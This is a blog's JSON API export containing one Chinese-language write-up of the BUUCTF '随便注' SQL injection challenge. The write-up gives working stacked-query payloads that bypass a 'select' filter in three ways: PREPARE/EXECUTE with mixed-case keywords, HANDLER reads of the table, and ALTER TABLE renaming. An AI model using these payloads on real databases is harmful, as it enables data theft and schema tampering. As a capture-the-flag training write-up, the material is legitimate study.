{"name":"堆叠查询&预编译","slug":"堆叠查询-预编译","count":1,"postlist":[{"title":"buu-随便注","slug":"buu-随便注","date":"2021-01-31T10:20:27.000Z","updated":"2021-02-01T06:41:39.050Z","comments":true,"path":"api/articles/buu-随便注.json","excerpt":"","keywords":null,"cover":"images/buu-sbz1.png","content":"<h1 id=\"buu-web第二题，随便注\"><a href=\"#buu-web第二题，随便注\" class=\"headerlink\" title=\"buu-web第二题，随便注\"></a>buu-web第二题，随便注</h1><p>题目很嚣张啊，打开一看，1，提交如下，给了一段代码<br><img src=\"images/buu-sbz1.png\" alt=\"buu-sbz1.png\"><br>接下来，根据常规操作，判断出字符型注入，两个字段，当我们开心地进行联合注入时，发现<br><img src=\"images/buu-sbz2.png\" alt=\"buu-sbz1.png\"><br>select被注释掉了，也就是不能联合查询找flag了，所以要绕过select，用别的方法。<br>看了好多大佬的wp，说因可以输入多个语句，因此可以用堆叠查询<br>先查数据库（没啥用）<br><img src=\"images/buu-sbz3.png\" alt=\"buu-sbz1.png\"><br>查表如下，有两个<br><img src=\"images/buu-sbz4.png\" alt=\"buu-sbz1.png\"><br>再查表中的列如下，发现了flag<br><img src=\"images/buu-sbz5.png\" alt=\"buu-sbz1.png\">     </p>\n<h2 id=\"方法1-预编译\"><a href=\"#方法1-预编译\" class=\"headerlink\" title=\"方法1.预编译\"></a>方法1.预编译</h2><p>flag在第一个表中，查flag，select被过滤，大佬说用预编译的方式绕过这个过滤，构造     </p>\n<pre><code>-1&#39;;set @sql = CONCAT(&#39;sele&#39;,&#39;ct * from\n`1919810931114514`;&#39;);prepare aaa from @sql;EXECUTE aaa; --+     </code></pre>\n<p>出现如下图,发现还过滤了set和prepare<br><img src=\"images/buu-sbz6.png\" alt=\"buu-sbz1.png\"><br>利用文件上传漏洞大小写绕过，重新构造payload如下：     </p>\n<pre><code>-1&#39;;Set @sql = CONCAT(&#39;sele&#39;,&#39;ct * from\n`1919810931114514`;&#39;);Prepare aaa from @sql;EXECUTE aaa; --+</code></pre>\n<p>欢天喜地，得到flag<br><img src=\"images/buu-sbz7.png\" alt=\"buu-sbz1.png\">    </p>\n<hr>\n<h2 id=\"方法2-handler查询\"><a href=\"#方法2-handler查询\" class=\"headerlink\" title=\"方法2.handler查询\"></a>方法2.handler查询</h2><p>mysql可以使用select查询表中的数据，也可使用handler语句，这条语句是一行一行的浏览一个表中的数据。<br>handler可以用于MyISAM和InnoDB表。<br>使用方法：<br>handler table_name open打开一张表<br>handel table_name read first读取第一行内容，<br>handel table_name read next依次获取其它行<br>最后一行执行之后再执行handel table_name read next会返回一个空的结果。<br>构造payload：</p>\n<pre><code>-1&#39;;handler `1919810931114514` open;handler `1919810931114514` read first;#    </code></pre>\n<p><img src=\"images/buu-sbz8.png\" alt=\"buu-sbz1.png\"><br>简单快捷，恐怖如斯！     </p>\n<hr>\n<h2 id=\"方法3-修改表名和列名\"><a href=\"#方法3-修改表名和列名\" class=\"headerlink\" title=\"方法3.修改表名和列名\"></a>方法3.修改表名和列名</h2><p>由上面知道flag在表“1919810931114514”中，查表words<br><img src=\"images/buu-sbz9.png\" alt=\"buu-sbz1.png\"><br>观察到有一列是data列，可以查询爆内容，我们可以利用数据库修改表名和列名的方法，将我们要查询的表名改成第二个，就可以查询出想要的内容了<br>操作如下：<br>alter table words rename to aaa;先把原来的words表名字改成其他<br>alter table 1919810931114514 rename to words;将表1919810931114514的名字改为words<br>alter table words change flag id varchar(100);将改完名字后的表中的flag改为id，字符串尽量长点<br>构造payload如下：</p>\n<pre><code>1&#39;; alter table words rename to aaaa;alter table `1919810931114514` rename to words;alter table words change flag id varchar(100);--+</code></pre>\n<p>然后我们用1’ or 1=1 –+直接就能得到正确结        </p>\n","text":"buu-web第二题，随便注题目很嚣张啊，打开一看，1，提交如下，给了一段代码<br> [Figure] 构造payload如下：1&#39;; alter table words rename to aaaa;alter table `1919810931114514` ren","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"堆叠查询&预编译","slug":"堆叠查询-预编译","count":1,"path":"api/tags/堆叠查询-预编译.json"}]}]}